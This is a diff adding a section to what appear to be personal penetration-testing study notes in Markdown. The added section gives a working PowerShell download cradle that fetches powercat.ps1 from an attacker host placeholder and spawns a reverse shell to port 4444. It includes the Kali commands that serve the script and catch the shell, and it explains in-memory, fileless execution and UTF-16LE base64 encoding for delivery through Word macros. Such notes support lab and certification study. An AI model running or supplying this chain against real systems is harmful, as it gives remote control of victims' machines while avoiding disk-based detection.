@@ -97,6 +97,18 @@ flowchart TD
 > export TERM=xterm                                 # on target (enables clear, arrows)
 > ```
 
+> [!example] PowerShell download cradle + PowerCat (Windows)
+> ```bash
+> # On Kali — serve powercat.ps1 + catch the shell
+> cd ~/Desktop/homebase/powercat && python3 -m http.server 80
+> nc -nvlp 4444
+> ```
+> ```powershell
+> # Runs on the TARGET — pulls powercat.ps1 from Kali, then calls back
+> powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>:8000/powercat.ps1');powercat -c <LHOST> -p 4444 -e powershell"
+> ```
+> 🔗 This is the payload embedded in both the [[Leveraging Microsoft Word macros]] and [[Obtaining code execution via Windows library files]] client-side vectors — `IEX(...).DownloadString(...)` fetches PowerCat into memory (no file dropped to disk), then `powercat -e powershell` spawns the reverse shell. For a VBA macro, the whole line needs to be **base64-encoded as UTF-16LE** first (see [[🔣 Encoding Reference]]) since VBA can't paste a 255+ char literal directly.
+
 ---
 
 ## 🛠️ 3. Payload generation (msfvenom)
